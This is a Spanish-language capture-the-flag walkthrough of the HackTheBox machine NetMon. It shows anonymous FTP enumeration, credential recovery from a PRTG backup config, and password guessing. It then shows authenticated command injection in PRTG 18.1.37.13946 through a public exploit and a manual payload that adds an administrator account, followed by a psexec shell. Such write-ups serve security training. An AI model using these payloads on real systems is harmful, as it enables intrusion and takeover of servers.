# NetMon

![](../../../../~gitbook/image.md)Publicado: 09 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
NetMon es una máquina de dificultad Easy de HackTheBox que ejecuta Windows Server. La máquina presenta un servicio FTP con acceso anónimo habilitado que permite acceder al sistema de archivos completo, facilitando la obtención de la flag de usuario. Para la escalada de privilegios, se explota una vulnerabilidad de ejecución remota de comandos autenticada en PRTG Network Monitor 18.1.37.13946, lo que permite crear un usuario administrador y obtener acceso completo al sistema.La máquina enseña conceptos importantes como la enumeración de servicios FTP, análisis de archivos de configuración, password guessing basado en patrones, y explotación de aplicaciones web empresariales.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
#### Escaneo de puertos TCP

#### Enumeración de servicios

### 🚪 Enumeración de Servicios

#### 🗂️ 21 FTP
La enumeración con nmap nos muestra que la autenticación anónima está habilitada en el servicio FTP.Para poder enumerar de una manera mas comoda los archivos mediante `ftp`, vamos a crearnos una montura con la herramienta `curlftpfs`.![](../../../../~gitbook/image.md)Encontramos y descargamos la primera flag del directorio Desktop del perfil del usuario Public:![](../../../../~gitbook/image.md)
#### 🌐 445 SMB
Dado que no tenemos credenciales, intentamos enumerar información mediante sesión anónima pero no parece estar habilitada. No hay mucho que rascar aquí.
#### 🌍 80 HTTP ( PRTG Network Monitor 18.1.37.13946 )
Accedemos a http://10.10.10.152/ y encontramos un servicio llamado PRTG Network Monitor![](../../../../~gitbook/image.md)PRTG Network Monitor ==es un software de monitorización de redes que permite supervisar el rendimiento y la disponibilidad de la infraestructura de TI==. Esta herramienta de [Paessler](https://www.paessler.com/es/network_monitoring_tool) es utilizada para monitorizar dispositivos como servidores, routers, switches, aplicaciones y servicios, así como métricas como la salud, la disponibilidad, el tráfico y el ancho de bandaBuscando información pública encontramos que las credenciales por defecto de esta aplicación son:- Username: `prtgadmin`
- Password: `prtgadmin`
Pero no parecen funcionar en esta ocasión.
#### Fuzzing de directorios
Realizamos fuzzing de directorios contra el puerto 80 pero en este caso no encontramos nada.
#### 🔍 Análisis de Configuración
Aprovechando que tenemos acceso a la máquina a través de la sesión anónima FTP. Buscamos información sobre el servicio PRTG Network Monitor y posibles rutas de interés donde guarda archivos de configuración:https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data![](../../../../~gitbook/image.md)
#### 🔐 Obtención de Credenciales
Es bastante contenido, por lo que podemos descargarlo a nuestro host de ataque y analizarlo detenidamente:Podemos intentar jugar con grep y algunas expresiones para filtrar por cadenas como "password"![](../../../../~gitbook/image.md)Los siguientes archivos parecen contener la palabra "password". Encontramos unas credenciales en el archivo PRTG Configuration.old.bak![](../../../../~gitbook/image.md)Probamos estas credenciales en el servicio pero no funcionan:![](../../../../~gitbook/image.md)Podemos tratar de hacer "guessing" y dado que el final de la contraseña coincide con el año, podemos ir probando otros años para ver si tenemos suerte:Y logramos acceder al aplicativo y además enumeramos la versión![](../../../../~gitbook/image.md)
#### 💥 Explotación
Buscamos exploits públicos y encontramos uno que nos permite explotar una ejecución remota de comandos autenticada.![](../../../../~gitbook/image.md)
#### Método 1 - Usando Exploit público
Dado que ahora tenemos credenciales, usaremos este exploit.![](../../../../~gitbook/image.md)El script nos pide indicar la url del servicio y una cookie para llevar a acabo la explotación logrando así crear un usuario en el grupo de administradores llamado pentest cuya contraseña será P3nT3st!Una vez autenticados en Network Monitor podemos usar por ejemplo la extensión Cookie Editor para copiar la cookie en formato Header String:![](../../../../~gitbook/image.md)De tal forma que el comando para ejecutar el exploit nos quedaría así:![](../../../../~gitbook/image.md)
#### Método 2 - Explotación Manual
Navegamos a siguiente opción: Setup -> Accounts Settings -> Notifications![](../../../../~gitbook/image.md)Hacemos scroll hasta abajo y habilitamos la opción Execute Program y especificamos el siguiente payload para la inyección:![](../../../../~gitbook/image.md)Una vez guardada la notificación. Volvemos atrás a la lista de notificaciones, seleccionamos la nuestra y hacemos click en el botón de la campana:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
#### 🏆 Post-Explotación
Esperamos unos segundos y ahora ya deberemos confirmar que ha ido bien probando la nueva cuenta de administrador con el servicio SMB:![](../../../../~gitbook/image.md)Usamos impacket para ganar acceso a la máquina con la nueva cuenta que hemos creado y obtenemos la flag:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🚪 Enumeración de Servicios](#enumeracion-de-servicios-1)

```
❯ ping -c2 10.10.10.152
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.152: icmp_seq=1 ttl=127 time=46.2 ms
64 bytes from 10.10.10.152: icmp_seq=2 ttl=127 time=47.6 ms

--- 10.10.10.152 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1007ms
rtt min/avg/max/mdev = 46.162/46.873/47.585/0.711 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.95 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669
```

```
❯ nmap -sC -sV -p$ports 10.10.10.152 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 15:33 CEST
Nmap scan report for 10.10.10.152
Host is up (0.047s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM                 inetpub
| 07-16-16  09:18AM                 PerfLogs
| 02-25-19  10:56PM                 Program Files
| 02-03-19  12:28AM                 Program Files (x86)
| 02-03-19  08:08AM                 Users
|_11-10-23  10:20AM                 Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-06-09T13:53:56
|_  start_date: 2025-06-09T13:41:28
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 18m57s, deviation: 0s, median: 18m57s

```

```
mkdir /mnt/monturaftp
curlftpfs ftp://10.10.10.152 /mnt/monturaftp
ls -l /mnt/monturaftp
```

```
total 721284
d--------- 1 root root         0 Nov 20  2016 '$RECYCLE.BIN'
---------- 1 root root         1 Jul 16  2016  BOOTNXT
d--------- 1 root root         0 Feb  3  2019 'Documents and Settings'
d--------- 1 root root         0 Jul 16  2016  PerfLogs
d--------- 1 root root         0 Feb 25  2019 'Program Files'
d--------- 1 root root         0 Feb  3  2019 'Program Files (x86)'
d--------- 1 root root         0 Dec 15  2021  ProgramData
d--------- 1 root root         0 Feb  3  2019  Recovery
d--------- 1 root root         0 Feb  3  2019 'System Volume Information'
d--------- 1 root root         0 Feb  3  2019  Users
d--------- 1 root root         0 Nov 10  2023  Windows
---------- 1 root root    389408 Nov 20  2016  bootmgr
d--------- 1 root root         0 Feb 25  2019  inetpub
---------- 1 root root 738197504 Jun  9 10:41  pagefile.sys
```

```
smbclient -N -L //10.10.10.152
session setup failed: NT_STATUS_ACCESS_DENIED
```

```
netexec smb 10.10.10.152 -u '' -p '' --shares

SMB         10.10.10.152    445    NETMON           [*] Windows 10 / Server 2016 Build 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
SMB         10.10.10.152    445    NETMON           [-] netmon\: STATUS_ACCESS_DENIED
SMB         10.10.10.152    445    NETMON           [-] Error enumerating shares: Error occurs while reading from remote(104)
```

```
enum4linux 10.10.10.152
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun  9 18:06:08 2025

=========================================( Target Information )=========================================

Target ........... 10.10.10.152
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

============================( Enumerating Workgroup/Domain on 10.10.10.152 )============================

[E] Can't find workgroup/domain

================================( Nbtstat Information for 10.10.10.152 )================================

Looking up status of 10.10.10.152
No reply from 10.10.10.152

===================================( Session Check on 10.10.10.152 )===================================

[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

```
%programdata%\Paessler\PRTG Network Monitor
```

```
mkdir NetMon
cd NetMon
wget -r ftp://10.10.10.152/ProgramData/Paessler
```

```
grep -r -l 'password' PRTG\ Network\ Monitor 2>/dev/null
```

```

PrTg@dmin2018

```

```
PrTg@dmin2019
```

```
searchsploit network monitor 18
```

```
_ga=GA1.4.249250931.1749485289;_gid=GA1.4.1024515395.1749485289;OCTOPUS1813713946=ezcxQUI5MUYwLTgwQkItNEUxRS04QUUyLUJBNEU4NkE2Q0E2NH0%3D
```

```
./46527.sh -u http://10.10.10.152 "_ga=GA1.4.249250931.1749485289;_gid=GA1.4.1024515395.1749485289;OCTOPUS1813713946=ezcxQUI5MUYwLTgwQkItNEUxRS04QUUyLUJBNEU4NkE2Q0E2NH0%3D"
```

```
test.txt;net user pentest p3nT3st! /add;net localgroup administrators pentest /add
```

```
netexec smb 10.10.10.152 -u 'pentest' -p 'p3nT3st!'
```

```
impacket-psexec pentest:'p3nT3st!'@10.10.10.152
```
